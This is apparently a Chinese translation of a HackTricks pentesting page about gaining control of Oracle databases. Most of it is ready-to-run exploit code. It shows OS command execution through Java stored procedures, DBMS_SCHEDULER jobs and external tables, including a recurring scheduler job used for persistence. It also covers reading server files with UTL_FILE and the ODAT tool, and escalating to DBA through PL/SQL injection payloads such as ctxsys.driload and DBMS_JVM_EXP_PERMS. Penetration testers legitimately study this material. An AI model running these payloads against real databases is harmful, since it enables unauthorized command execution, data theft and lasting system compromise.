<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# RCE: Java存储过程

所以，假设你有管理员账户信息。在这种情况下，一种非常流行的在服务器上执行命令的方法是编写一个'java stored'存储过程。这可以分为三个阶段。首先，创建一个名为'oraexec'的Java类。要做到这一点，通过'sqlplus'终端连接并编写：
```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
public static void execCommand(String command) throws IOException
{
Runtime.getRuntime().exec(command);
}
}
/

```
接下来，为这个类编写一个PL/SQL包装器：
```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
就是这样。现在，要执行一个命令，你只需要发送以下查询：
```text
exec javacmd('command');
```
请注意，使用上述过程时，我们无法看到执行命令的结果，但是您可以将输出重定向到文件并进行读取。您可以在以下位置找到允许读写文件的shell的完整代码：

{% file src="../../.gitbook/assets/raptor\_oraexec.sql" %}

然而，有一个更复杂的脚本（goo.gl/EuwPRU）可以处理命令输出，但它的大小较大[在这里](https://oracle-base.com/articles/8i/shell-commands-from-plsql)。

# RCE: 调度程序

下一种方法是使用Oracle的内置任务调度程序‘dbmsscheduler’，如果没有Java虚拟机，这将对我们有所帮助。要使用它，您必须具有‘CREATE EXTERNAL JOB’特权。以下是一个代码示例，将字符串‘0wned’输入到C:驱动器根目录下的文本文件中：
```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);
```
这将创建并运行一个用于执行您的命令的作业。这里还有一个从另一个过程调用调度程序的选项 - 'SYS.KUPP$PROC.CREATE\_MASTER\_PROCESS'，这对我们来说是有兴趣的，主要是因为它允许您嵌入多语句查询，即由多个子查询组成的查询。理论上，即使在对Web应用程序进行注入的情况下，您也可以运行此类查询。
```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```
请注意，当您使用调度程序时，可以多次运行此作业，并且可以以一定的频率运行。因此，这将帮助您在被测试的系统中立足，因为即使管理员从操作系统中删除了用户，该作业仍会定期在系统中运行，将其重新激活。

# RCE: 外部表

作为实现执行操作系统命令的最后一种方法，我想提到使用外部表。此方法将帮助您稍后从服务器下载文件。您将需要以下权限：

* UTL\_FILE;
* CREATE TABLE;
* 为用户保留的目录。

让我们记住，默认情况下，所有具有“CONNECT”角色的帐户都可以访问“UTL\_FILE”包。第一步：使用以下查询检查已发出的目录：
```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;

TABLE_NAME
------------------------------
ALICE_DIR
```
第二步：创建一个可执行的批处理文件，包含所需的命令：
```text
declare
f utl_file.file_type;
s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
f := utl_file.fopen('ALICE_DIR','test.bat','W');
utl_file.put_line(f,s);
utl_file.fclose(f);
end;
/
```
第三步：准备外部表'EXTT'，您将需要它来运行文件：
```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
DEFAULT DIRECTORY ALICE_DIR
ACCESS PARAMETERS
( RECORDS DELIMITED BY NEWLINE
FIELDS TERMINATED BY ',')
LOCATION (alice_dir:'test.bat'))
/
```
现在，只需使用以下命令调用批处理文件：
```text
SELECT * from EXTT;
```
终端将开始显示系统无法匹配表和调用文件的错误消息，但在这种情况下，这并不重要，因为主要目标是打开可执行文件，而您已经实现了这一目标。

‘ODAT.py’工具也可以实现这种攻击。但是，它需要特权‘CREATE ANY DIRECTORY’，默认情况下只授予DBA角色，因为它尝试从任何目录而不仅仅是“您”的目录执行文件。

# 读/写文件

现在，让我们继续进行读取和写入文件的任务。如果您只需要读取或写入服务器上的文件，可以在不使用任何Java过程的情况下完成，但是Java过程也可以处理此类任务。让我们看一下‘UTL\_FILE’包，它具有与文件系统一起工作所需的功能。好消息是，默认情况下，所有具有‘PUBLIC’角色的用户都可以访问它。坏消息是，默认情况下，此过程无法访问整个文件系统，而只能访问由管理员预定义的目录。但是，通常可以找到将目录参数指定为‘\*’的情况，这意味着“访问所有内容”。您可以使用以下命令找到这一点：
```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```
我发现使用“UTL_FILE”包的最简短的步骤是由Alexander Polyakov提出的：
```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/’,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/

```
如果您需要更多的功能和写入能力，我建议您搜索一个名为'raptor_oraexec.sql'的脚本。按照传统，这里还有一个使用'ODAT'实用工具的选项，这个选项通常是最简短的：
```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```
‘UTL_FILE’包也非常有趣，因为如果你幸运的话，你可以访问日志、配置文件，并获取特权账户（如‘SYS’）的密码。

我想提到的第二种方法是再次使用‘External Tables’。请记住，当使用‘External Tables’时，数据库可以以只读模式访问外部表中的数据。对于黑客来说，这意味着又有一次从服务器下载文件的机会，但这种方法需要‘CREATE ANY DIRECTORY’权限。我建议立即使用‘ODAT’，因为它稳定且快速：
```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
# 提权

您可以使用各种方法来提权，从经典的缓冲区溢出和DLL补丁到针对数据库的专门攻击，例如PL/SQL注入。这个主题非常广泛，在本文中，我不会详细讨论，因为这已经在大型研究论文中讨论过，比如\[Lichfield\]（goo.gl/IebQN4）和\[Finnigan\]（goo.gl/vXhttf）的博客中。我只会演示其中一些方法，以便您有一个大致的了解。在测试过程中，我建议您只需注意当前权限，并基于此在互联网上寻找所需的漏洞。

与MS SQL不同，攻击者无法在“SELECT”之后立即注入“xp_cmdshell”，只需用引号关闭即可。Oracle DB坚决拒绝此类技巧。因此，我们不能每次都采用经典的SQL注入方法，尽管在这种情况下，也有办法可以解决。我们将考虑PL/SQL注入，通过将随机命令嵌入到可用输入参数中，修改执行过程中的过程（函数、触发器和其他对象）。\(с\) Sh2kerr

为了嵌入有效载荷，找到一个不过滤输入参数的函数。请记住，Oracle SQL不允许多语句（多个）查询，因此，很可能您需要使用一些具有此功能的“特殊”过程。攻击的主要思想如下：默认情况下，除非另有规定，过程是以所有者的身份而不是启动它的用户的身份执行的。换句话说，如果一个属于“SYS”账户的过程可供执行，并且您可以将代码嵌入其中，您的有效载荷也将在“SYS”账户的上下文中执行。正如我之前提到的，这并不总是发生，因为有一些带有“authid current_user”参数的过程，这意味着该过程将以当前用户的权限执行。然而，通常在每个版本中，您都可以找到一些容易受到PL/SQL注入攻击的函数。该过程的一般视图如图2所示。

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

简而言之，我们传递一些恶意代码作为预期的合法参数，这些代码将成为过程的一部分。一个很好的例子是“CTXSYS.DRILOAD”函数。它以“CTXSYS”的名义执行，并且不过滤输入参数，这使您可以轻松提升到DBA权限：
```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```
然而，现在这可能已经是历史了，因为这个漏洞是在2004年发现的，只影响旧版本8-9。通常，提升权限的过程分为两个部分：编写增加权限的过程和执行注入本身。一个典型的过程如下所示：
```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```
现在我们可以将一个过程作为易受攻击的函数的参数进行注入（适用于10x版本的示例）：
```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 –-');
```
在不太新的10和11版本中，有一个“不错”的例外，或者说是一个漏洞，允许您在没有DBA权限的情况下在服务器上执行命令：'DBMS_JVM_EXP_PERMS'过程允许具有'CREATE SESSION'权限的用户获得'JAVA IO'权限。攻击可以按照以下方式进行：
```text
SQL&gt; DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/

PL/SQL procedure successfully completed.
```
现在您拥有调用Java过程的权限，您可以调用Windows解释器并执行一些操作：
```text
SQL&gt; select dbms_java.runjava(‘oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack’)from dual;
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
